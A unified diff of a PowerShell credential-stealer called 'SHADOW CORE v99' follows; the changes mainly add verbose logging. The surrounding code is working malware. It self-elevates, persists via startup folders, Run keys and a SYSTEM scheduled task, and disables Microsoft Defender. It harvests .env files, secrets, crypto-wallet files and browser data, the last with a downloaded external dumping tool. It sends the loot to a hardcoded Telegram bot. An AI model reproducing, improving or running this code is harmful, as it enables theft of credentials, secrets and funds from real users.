@@ -1,9 +1,10 @@
 #Requires -Version 5.1
 # ============================================================
-# SHADOW CORE v99 - .ENV FILE EXFILTRATOR (POWERSHELL)
+# SHADOW CORE v99 - .ENV EXFILTRATOR (VERBOSE)
 # ============================================================
 
-$ErrorActionPreference = 'SilentlyContinue'
+$ErrorActionPreference = 'Continue'
+$VerbosePreference = 'Continue'
 
 $BOT_TOKEN = "8421766867:AAF_3BKKFiBoIhaV5PL8YuX1p46Wn-7eUq8"
 $CHAT_ID = "7361517001"
@@ -18,6 +19,12 @@ $TEMP_DIR = "$env:ProgramData\Microsoft\Windows\Update\data"
 $DATA_DIR = "$TEMP_DIR\extracted_data"
 $BROWSER_DATA_URL = "https://infinityteq.github.io/hack-browser-data.exe"
 
+Write-Host "[VERBOSE] Script Path: $SCRIPT_PATH" -ForegroundColor Cyan
+Write-Host "[VERBOSE] Temp Directory: $TEMP_DIR" -ForegroundColor Cyan
+Write-Host "[VERBOSE] Data Directory: $DATA_DIR" -ForegroundColor Cyan
+Write-Host "[VERBOSE] Browser Tool URL: $BROWSER_DATA_URL" -ForegroundColor Cyan
+Write-Host ""
+
 New-Item -ItemType Directory -Force -Path $TEMP_DIR | Out-Null
 New-Item -ItemType Directory -Force -Path $DATA_DIR | Out-Null
 
@@ -29,15 +36,19 @@ function Test-Admin {
 
 function Elevate-Admin {
     if (-not (Test-Admin)) {
+        Write-Host "[VERBOSE] Not running as admin. Elevating..." -ForegroundColor Yellow
         $arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$SCRIPT_PATH`""
         Start-Process powershell.exe -Verb RunAs -ArgumentList $arguments
         exit
+    } else {
+        Write-Host "[VERBOSE] Running as Administrator." -ForegroundColor Green
     }
 }
 Elevate-Admin
+Write-Host ""
 
 function Add-ToStartup {
-    Write-Host "[*] Deploying persistence..."
+    Write-Host "[VERBOSE] Deploying persistence..." -ForegroundColor Yellow
     $success = 0
     $total = 0
     
@@ -49,10 +60,14 @@ function Add-ToStartup {
         if (-not (Test-Path $dest)) {
             Copy-Item $SCRIPT_PATH $dest -Force
             attrib +h $dest
-            Write-Host "[+] User Startup: $dest"
+            Write-Host "[VERBOSE] [+] User Startup: $dest" -ForegroundColor Green
             $success++
+        } else {
+            Write-Host "[VERBOSE] [-] User Startup already exists." -ForegroundColor Gray
         }
-    } catch {}
+    } catch {
+        Write-Host "[VERBOSE] [-] Failed to copy to User Startup: $($_.Exception.Message)" -ForegroundColor Red
+    }
     
     # System Startup Folder
     $total++
@@ -62,60 +77,83 @@ function Add-ToStartup {
         if (-not (Test-Path $dest)) {
             Copy-Item $SCRIPT_PATH $dest -Force
             attrib +h $dest
-            Write-Host "[+] System Startup: $dest"
+            Write-Host "[VERBOSE] [+] System Startup: $dest" -ForegroundColor Green
             $success++
+        } else {
+            Write-Host "[VERBOSE] [-] System Startup already exists." -ForegroundColor Gray
         }
-    } catch {}
+    } catch {
+        Write-Host "[VERBOSE] [-] Failed to copy to System Startup: $($_.Exception.Message)" -ForegroundColor Red
+    }
     
     # HKCU Registry
     $total++
     try {
         Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ShadowCore" -Value "`"$SCRIPT_PATH`"" -Force
-        Write-Host "[+] HKCU Registry: ShadowCore"
+        Write-Host "[VERBOSE] [+] HKCU Registry: ShadowCore" -ForegroundColor Green
         $success++
-    } catch {}
+    } catch {
+        Write-Host "[VERBOSE] [-] Failed to set HKCU Registry: $($_.Exception.Message)" -ForegroundColor Red
+    }
     
     # HKLM Registry
     $total++
     try {
         Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ShadowCoreSystem" -Value "`"$SCRIPT_PATH`"" -Force
-        Write-Host "[+] HKLM Registry: ShadowCoreSystem"
+        Write-Host "[VERBOSE] [+] HKLM Registry: ShadowCoreSystem" -ForegroundColor Green
         $success++
-    } catch {}
+    } catch {
+        Write-Host "[VERBOSE] [-] Failed to set HKLM Registry: $($_.Exception.Message)" -ForegroundColor Red
+    }
     
     # Scheduled Task
     $total++
     try {
         $taskName = "ShadowCoreGrabber"
         schtasks /create /tn "$taskName" /tr "`"$SCRIPT_PATH`"" /sc onlogon /ru SYSTEM /rl HIGHEST /f | Out-Null
-        Write-Host "[+] Scheduled Task: $taskName"
+        Write-Host "[VERBOSE] [+] Scheduled Task: $taskName" -ForegroundColor Green
         $success++
-    } catch {}
+    } catch {
+        Write-Host "[VERBOSE] [-] Failed to create Scheduled Task: $($_.Exception.Message)" -ForegroundColor Red
+    }
     
-    Write-Host "[*] Persistence: $success/$total methods deployed"
+    Write-Host "[VERBOSE] Persistence: $success/$total methods deployed." -ForegroundColor Yellow
 }
 
 function Send-TelegramMessage {
     param([string]$Text)
     try {
+        Write-Host "[VERBOSE] Sending Telegram message..." -ForegroundColor Gray
         $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
         $body = @{ chat_id = $CHAT_ID; text = $Text.Substring(0, [Math]::Min($Text.Length, 4000)) } | ConvertTo-Json
         Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json" -TimeoutSec 30 -EA Stop | Out-Null
-    } catch {}
+        Write-Host "[VERBOSE] [+] Message sent." -ForegroundColor Green
+    } catch {
+        Write-Host "[VERBOSE] [-] Failed to send message: $($_.Exception.Message)" -ForegroundColor Red
+    }
 }
 
 function Send-TelegramFile {
     param([string]$FilePath)
     try {
-        if (-not (Test-Path $FilePath)) { return $false }
+        Write-Host "[VERBOSE] Preparing to send file: $FilePath" -ForegroundColor Gray
+        if (-not (Test-Path $FilePath)) { 
+            Write-Host "[VERBOSE] [-] File not found: $FilePath" -ForegroundColor Red
+            return $false 
+        }
         $fileSize = (Get-Item $FilePath).Length / 1MB
-        if ($fileSize -gt 45) { return $false }
+        if ($fileSize -gt 45) { 
+            Write-Host "[VERBOSE] [-] File too large: $([math]::Round($fileSize, 1))MB" -ForegroundColor Yellow
+            return $false 
+        }
+        Write-Host "[VERBOSE] File size: $([math]::Round($fileSize, 2))MB" -ForegroundColor Gray
         
         $url = "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"
         $boundary = [System.Guid]::NewGuid().ToString("N")
         $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
         $fileName = Split-Path $FilePath -Leaf
         
+        Write-Host "[VERBOSE] Uploading $fileName..." -ForegroundColor Gray
         $part1 = [System.Text.Encoding]::UTF8.GetBytes("--$boundary`r`nContent-Disposition: form-data; name=`"chat_id`"`r`n`r`n$CHAT_ID`r`n")
         $part2 = [System.Text.Encoding]::UTF8.GetBytes("--$boundary`r`nContent-Disposition: form-data; name=`"document`"; filename=`"$fileName`"`r`nContent-Type: application/octet-stream`r`n`r`n")
         $footer = [System.Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--`r`n")
@@ -128,8 +166,12 @@ function Send-TelegramFile {
         $bodyBytes = $body.ToArray()
         
         $response = Invoke-RestMethod -Uri $url -Method Post -Body $bodyBytes -ContentType "multipart/form-data; boundary=$boundary" -TimeoutSec 60 -EA Stop
+        Write-Host "[VERBOSE] [+] File sent: $fileName" -ForegroundColor Green
         return $true
-    } catch { return $false }
+    } catch {
+        Write-Host "[VERBOSE] [-] Failed to send file: $($_.Exception.Message)" -ForegroundColor Red
+        return $false
+    }
 }
 
 function Send-TelegramSummary {
@@ -155,10 +197,13 @@ $DataSummary
 ❌ Failed: $Failed
 "@
         Send-TelegramMessage -Text $summary
-    } catch {}
+    } catch {
+        Write-Host "[VERBOSE] [-] Failed to send summary: $($_.Exception.Message)" -ForegroundColor Red
+    }
 }
 
 function Get-AllUsers {
+    Write-Host "[VERBOSE] Enumerating all users..." -ForegroundColor Yellow
     $users = @()
     $systemDrive = $env:SystemDrive
     
@@ -182,7 +227,7 @@ function Get-AllUsers {
                         roaming = "$userPath\AppData\Roaming"
                         localappdata = "$userPath\AppData\Local"
                     }
-                    Write-Host "    [+] Found user: $user"
+                    Write-Host "[VERBOSE] Found user: $user" -ForegroundColor Gray
                 }
             }
         }
@@ -202,10 +247,11 @@ function Get-AllUsers {
                 roaming = "$userPath\AppData\Roaming"
                 localappdata = "$userPath\AppData\Local"
             }
-            Write-Host "    [+] Added current user: $currentUser"
+            Write-Host "[VERBOSE] Added current user: $currentUser" -ForegroundColor Gray
         }
     }
     
+    Write-Host "[VERBOSE] Total users found: $($users.Count)" -ForegroundColor Yellow
     return $users
 }
 
@@ -219,7 +265,7 @@ function Scan-EnvFiles {
     
     foreach ($user in $Users) {
         $userName = $user.username
-        Write-Host "[*] Scanning user: $userName"
+        Write-Host "[VERBOSE] Scanning user: $userName" -ForegroundColor Yellow
         
         $dirsToScan = @(
             $user.path,
@@ -230,8 +276,9 @@ function Scan-EnvFiles {
             $user.localappdata
         ) | Where-Object { $_ -and (Test-Path $_) }
         
+        Write-Host "[VERBOSE] Scanning directories: $($dirsToScan.Count) paths" -ForegroundColor Gray
         foreach ($scanDir in $dirsToScan) {
-            Write-Host "    Scanning: $scanDir"
+            Write-Host "[VERBOSE] Scanning: $scanDir" -ForegroundColor Gray
             Get-ChildItem -Path $scanDir -Recurse -File -EA SilentlyContinue | ForEach-Object {
                 $file = $_.Name
                 $fileLower = $file.ToLower()
@@ -245,14 +292,14 @@ function Scan-EnvFiles {
                             User = $userName
                             Directory = $_.DirectoryName
                         }
-                        Write-Host "        ✅ Found: $filePath"
+                        Write-Host "[VERBOSE] ✅ Found: $filePath" -ForegroundColor Green
                     }
                 }
             }
         }
     }
     
-    Write-Host "`n[+] Found $($foundFiles.Count) .env files"
+    Write-Host "[VERBOSE] Total .env files found: $($foundFiles.Count)" -ForegroundColor Yellow
     return $foundFiles
 }
 
@@ -327,13 +374,15 @@ function Extract-Secrets {
                     Add-Content -Path $secretsFile -Value "  $secret" -Encoding UTF8
                 }
                 $foundSecrets += $secretsInFile.Count
-                Write-Host "[+] Found $($secretsInFile.Count) secrets in: $(Split-Path $filePath -Leaf)"
+                Write-Host "[VERBOSE] [+] Found $($secretsInFile.Count) secrets in: $(Split-Path $filePath -Leaf)" -ForegroundColor Green
             }
-        } catch {}
+        } catch {
+            Write-Host "[VERBOSE] [-] Error extracting secrets from $filePath: $($_.Exception.Message)" -ForegroundColor Red
+        }
     }
     
     if ($foundSecrets -gt 0 -and (Test-Path $secretsFile)) {
-        Write-Host "`n[+] Total secrets found: $foundSecrets"
+        Write-Host "[VERBOSE] Total secrets found: $foundSecrets" -ForegroundColor Yellow
         return $secretsFile
     }
     return $null
@@ -364,10 +413,12 @@ function Extract-Wallets {
         $base = $user.roaming
         if (-not $base) { continue }
         
+        Write-Host "[VERBOSE] Scanning wallets for user: $userName" -ForegroundColor Yellow
         foreach ($walletName in $walletPatterns.Keys) {
             $patterns = $walletPatterns[$walletName]
             foreach ($pattern in $patterns) {
                 $fullPattern = "$base\$pattern"
+                Write-Host "[VERBOSE] Checking pattern: $fullPattern" -ForegroundColor Gray
                 Get-ChildItem -Path $fullPattern -File -EA SilentlyContinue | ForEach-Object {
                     if ($_.Length -gt 0) {
                         $dest = "$walletDir\$userName\$walletName\$($_.Name)"
@@ -375,33 +426,53 @@ function Extract-Wallets {
                         New-Item -ItemType Directory -Force -Path $destDir | Out-Null
                         Copy-Item $_.FullName $dest -Force
                         $foundFiles += $dest
-                        # ===== FIXED LINE =====
-                        Write-Host "[+] ${walletName}: $($_.Name)"
+                        Write-Host "[VERBOSE] [+] ${walletName}: $($_.Name)" -ForegroundColor Green
                     }
                 }
             }
         }
     }
     
-    Write-Host "`n📊 Total wallets found: $($foundFiles.Count)"
+    Write-Host "[VERBOSE] Total wallets found: $($foundFiles.Count)" -ForegroundColor Yellow
     return $foundFiles
 }
 
 function Download-BrowserTool {
     $output = "$TEMP_DIR\hack-browser-data.exe"
+    Write-Host "[VERBOSE] Browser tool path: $output" -ForegroundColor Gray
+    
     if (Test-Path $output) {
-        try { attrib -r -h -s $output; Remove-Item $output -Force } catch {}
+        Write-Host "[VERBOSE] Existing browser tool found. Removing..." -ForegroundColor Yellow
+        try { 
+            attrib -r -h -s $output
+            Remove-Item $output -Force
+            Write-Host "[VERBOSE] [+] Removed existing file." -ForegroundColor Green
+        } catch {
+            Write-Host "[VERBOSE] [-] Could not remove existing file: $($_.Exception.Message)" -ForegroundColor Red
+        }
     }
     
+    Write-Host "[VERBOSE] Downloading hack-browser-data.exe from $BROWSER_DATA_URL..." -ForegroundColor Yellow
     try {
-        Write-Host "[*] Downloading hack-browser-data.exe..."
         $webClient = New-Object System.Net.WebClient
         $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
         $webClient.DownloadFile($BROWSER_DATA_URL, $output)
-        Write-Host "[+] Downloaded: $output"
+        Write-Host "[VERBOSE] [+] Downloaded: $output" -ForegroundColor Green
+        
+        # Verify the file exists and has a valid size
+        if (Test-Path $output) {
+            $fileSize = (Get-Item $output).Length
+            Write-Host "[VERBOSE] File size: $fileSize bytes" -ForegroundColor Gray
+            if ($fileSize -gt 0) {
+                Write-Host "[VERBOSE] [+] Download successful. File is valid." -ForegroundColor Green
+            } else {
+                Write-Host "[VERBOSE] [-] Downloaded file is empty!" -ForegroundColor Red
+                return $null
+            }
+        }
         return $output
     } catch {
-        Write-Host "[-] Download failed: $($_.Exception.Message)"
+        Write-Host "[VERBOSE] [-] Download failed: $($_.Exception.Message)" -ForegroundColor Red
         return $null
     }
 }
@@ -412,73 +483,98 @@ function Extract-BrowserData {
     Write-Host "🌐 BROWSER DATA EXTRACTION"
     Write-Host "=" * 80
     
+    Write-Host "[VERBOSE] Killing browser processes..." -ForegroundColor Yellow
     @('chrome.exe', 'msedge.exe', 'brave.exe', 'firefox.exe', 'opera.exe') | ForEach-Object {
-        try { Stop-Process -Name $_.Replace('.exe', '') -Force -EA SilentlyContinue } catch {}
+        try { 
+            Stop-Process -Name $_.Replace('.exe', '') -Force -EA SilentlyContinue
+            Write-Host "[VERBOSE] [-] Killed: $_" -ForegroundColor Gray
+        } catch {
+            Write-Host "[VERBOSE] [-] Could not kill: $_ (may not be running)" -ForegroundColor Gray
+        }
     }
     
     $browserDir = "$DATA_DIR\browser"
     New-Item -ItemType Directory -Force -Path $browserDir | Out-Null
+    Write-Host "[VERBOSE] Browser data output directory: $browserDir" -ForegroundColor Gray
+    
     Push-Location $browserDir
     
     try {
+        Write-Host "[VERBOSE] Executing: $ExePath dump -b all -c all -d . -f json --zip" -ForegroundColor Yellow
         $process = Start-Process -FilePath $ExePath -ArgumentList "dump -b all -c all -d . -f json --zip" -Wait -PassThru -NoNewWindow -RedirectStandardOutput "$browserDir\output.log" -RedirectStandardError "$browserDir\error.log"
+        Write-Host "[VERBOSE] Process exited with code: $($process.ExitCode)" -ForegroundColor Gray
         
         $foundFiles = @()
         Get-ChildItem -Path $browserDir -Recurse -File | Where-Object { $_.Extension -match '\.(json|zip|csv)$' } | ForEach-Object {
             $foundFiles += $_.FullName
+            Write-Host "[VERBOSE] Found output file: $($_.FullName)" -ForegroundColor Gray
         }
         
         if ($foundFiles.Count -gt 0) {
-            Write-Host "[+] Found $($foundFiles.Count) browser data files"
+            Write-Host "[VERBOSE] [+] Found $($foundFiles.Count) browser data files" -ForegroundColor Green
+        } else {
+            Write-Host "[VERBOSE] [-] No browser data files found." -ForegroundColor Yellow
+            # Check if error.log exists for debugging
+            if (Test-Path "$browserDir\error.log") {
+                Write-Host "[VERBOSE] Error log content:" -ForegroundColor Red
+                Get-Content "$browserDir\error.log" | ForEach-Object { Write-Host "[VERBOSE] $_" -ForegroundColor Red }
+            }
         }
+        Pop-Location
         return $foundFiles
-    } catch {}
-    
-    Pop-Location
-    return @()
+    } catch {
+        Write-Host "[VERBOSE] [-] Browser extraction failed: $($_.Exception.Message)" -ForegroundColor Red
+        Pop-Location
+        return @()
+    }
 }
 
 function Send-FilesIndividually {
     param($FileList, $CategoryName = "Files")
     
-    Write-Host "`n[*] Sending $($FileList.Count) $CategoryName files..."
+    Write-Host "[VERBOSE] Sending $($FileList.Count) $CategoryName files..." -ForegroundColor Yellow
     $sent = 0
     $failed = 0
     $i = 0
     
     foreach ($filePath in $FileList) {
         $i++
-        if (-not (Test-Path $filePath)) { continue }
+        if (-not (Test-Path $filePath)) { 
+            Write-Host "[VERBOSE] [$i/$($FileList.Count)] File not found: $filePath" -ForegroundColor Red
+            $failed++
+            continue 
+        }
         
         try {
             $fileSize = (Get-Item $filePath).Length / 1MB
             if ($fileSize -gt 45) {
-                Write-Host "    [$i/$($FileList.Count)] ⚠️ Skipping $(Split-Path $filePath -Leaf) - $([math]::Round($fileSize, 1))MB"
+                Write-Host "[VERBOSE] [$i/$($FileList.Count)] ⚠️ Skipping $(Split-Path $filePath -Leaf) - $([math]::Round($fileSize, 1))MB" -ForegroundColor Yellow
                 $failed++
                 continue
             }
             
-            Write-Host "    [$i/$($FileList.Count)] 📤 Sending: $(Split-Path $filePath -Leaf) ($([math]::Round($fileSize, 2))MB)"
+            Write-Host "[VERBOSE] [$i/$($FileList.Count)] 📤 Sending: $(Split-Path $filePath -Leaf) ($([math]::Round($fileSize, 2))MB)" -ForegroundColor Gray
             if (Send-TelegramFile -FilePath $filePath) {
                 $sent++
-                Write-Host "        ✅ Sent"
+                Write-Host "[VERBOSE] [$i/$($FileList.Count)] ✅ Sent" -ForegroundColor Green
             } else {
                 $failed++
-                Write-Host "        ❌ Failed to send"
+                Write-Host "[VERBOSE] [$i/$($FileList.Count)] ❌ Failed to send" -ForegroundColor Red
             }
             Start-Sleep -Milliseconds 500
         } catch {
             $failed++
-            Write-Host "    [$i/$($FileList.Count)] ❌ Error: $($_.Exception.Message)"
+            Write-Host "[VERBOSE] [$i/$($FileList.Count)] ❌ Error: $($_.Exception.Message)" -ForegroundColor Red
         }
     }
     
+    Write-Host "[VERBOSE] $CategoryName: Sent $sent, Failed $failed" -ForegroundColor Yellow
     return @{ Sent = $sent; Failed = $failed }
 }
 
 function Main {
     Write-Host "=" * 80
-    Write-Host "SHADOW CORE v99 - FINAL EXFILTRATOR"
+    Write-Host "SHADOW CORE v99 - FINAL EXFILTRATOR (VERBOSE)"
     Write-Host "PS1: $SCRIPT_PATH"
     Write-Host "=" * 80
     Write-Host ""
@@ -486,7 +582,7 @@ function Main {
     Write-Host "[PHASE 0] DETECTING ALL USERS"
     Write-Host "-" * 80
     $users = Get-AllUsers
-    Write-Host "`n[*] Found $($users.Count) user profile(s):"
+    Write-Host "[VERBOSE] Found $($users.Count) user profile(s)" -ForegroundColor Yellow
     foreach ($user in $users) { Write-Host "    - $($user.username)" }
     Write-Host ""
     
@@ -498,14 +594,18 @@ function Main {
     Write-Host "[PHASE 2] DISABLING DEFENDER"
     Write-Host "-" * 80
     try {
+        Write-Host "[VERBOSE] Disabling Defender real-time monitoring..." -ForegroundColor Yellow
         powershell -Command "Set-MpPreference -DisableRealtimeMonitoring `$true" -EA SilentlyContinue
+        Write-Host "[VERBOSE] Adding exclusion path: $TEMP_DIR" -ForegroundColor Yellow
         powershell -Command "Add-MpPreference -ExclusionPath '$TEMP_DIR'" -EA SilentlyContinue
+        Write-Host "[VERBOSE] Adding exclusion process: shadow_core.ps1" -ForegroundColor Yellow
         powershell -Command "Add-MpPreference -ExclusionProcess 'shadow_core.ps1'" -EA SilentlyContinue
-        Write-Host "[+] Defender disabled"
-    } catch {}
+        Write-Host "[VERBOSE] [+] Defender disabled" -ForegroundColor Green
+    } catch {
+        Write-Host "[VERBOSE] [-] Failed to disable Defender: $($_.Exception.Message)" -ForegroundColor Red
+    }
     Write-Host ""
     
-    $allFiles = @()
     $dataSummaryItems = @()
     $totalSent = 0
     $totalFailed = 0
@@ -518,6 +618,7 @@ function Main {
     if ($envFiles.Count -gt 0) {
         $envCopyDir = "$DATA_DIR\env_files"
         New-Item -ItemType Directory -Force -Path $envCopyDir | Out-Null
+        Write-Host "[VERBOSE] Copying .env files to $envCopyDir..." -ForegroundColor Yellow
         
         foreach ($fileInfo in $envFiles) {
             try {
@@ -529,9 +630,11 @@ function Main {
                     $dest = "$userDir\$(Split-Path $src -Leaf)"
                     Copy-Item $src $dest -Force
                     $envFilePaths += $dest
-                    Write-Host "    [+] Copied: $(Split-Path $src -Leaf) ($userName)"
+                    Write-Host "[VERBOSE] [+] Copied: $(Split-Path $src -Leaf) ($userName)" -ForegroundColor Green
                 }
-            } catch {}
+            } catch {
+                Write-Host "[VERBOSE] [-] Failed to copy: $($_.Exception.Message)" -ForegroundColor Red
+            }
         }
         
         $dataSummaryItems += "📁 .env Files: $($envFilePaths.Count) files"
@@ -540,6 +643,7 @@ function Main {
         if ($secretsFile -and (Test-Path $secretsFile)) {
             $envFilePaths += $secretsFile
             $dataSummaryItems += "🔑 Secrets extracted"
+            Write-Host "[VERBOSE] [+] Secrets file: $secretsFile" -ForegroundColor Green
         }
         
         if ($envFilePaths.Count -gt 0) {
@@ -548,7 +652,7 @@ function Main {
             $totalFailed += $result.Failed
         }
     } else {
-        Write-Host "[-] No .env files found"
+        Write-Host "[VERBOSE] [-] No .env files found." -ForegroundColor Yellow
     }
     Write-Host ""
     
@@ -567,13 +671,18 @@ function Main {
     Write-Host "-" * 80
     $exePath = Download-BrowserTool
     if ($exePath) {
+        Write-Host "[VERBOSE] [+] Browser tool downloaded successfully." -ForegroundColor Green
         $browserFiles = Extract-BrowserData -ExePath $exePath
         if ($browserFiles.Count -gt 0) {
             $dataSummaryItems += "🌐 Browser Data: $($browserFiles.Count) files"
             $result = Send-FilesIndividually -FileList $browserFiles -CategoryName "Browser"
             $totalSent += $result.Sent
             $totalFailed += $result.Failed
+        } else {
+            Write-Host "[VERBOSE] [-] No browser data files extracted." -ForegroundColor Yellow
         }
+    } else {
+        Write-Host "[VERBOSE] [-] Browser tool download failed. Skipping browser data extraction." -ForegroundColor Red
     }
     Write-Host ""
     
@@ -588,14 +697,19 @@ function Main {
     Write-Host "📤 Sent: $totalSent"
     Write-Host "❌ Failed: $totalFailed"
     Write-Host "=" * 80
+    Write-Host "[VERBOSE] Script will now persist and run every hour." -ForegroundColor Cyan
     
-    while ($true) { Start-Sleep -Seconds 3600 }
+    while ($true) { 
+        Write-Host "[VERBOSE] Sleeping for 3600 seconds..." -ForegroundColor Gray
+        Start-Sleep -Seconds 3600 
+    }
 }
 
 try {
     Main
 } catch {
-    Write-Host "[!] Error: $($_.Exception.Message)"
+    Write-Host "[VERBOSE] [!] FATAL ERROR: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "[VERBOSE] [!] Stack Trace: $($_.ScriptStackTrace)" -ForegroundColor Red
     Start-Sleep -Seconds 10
     Main
 }
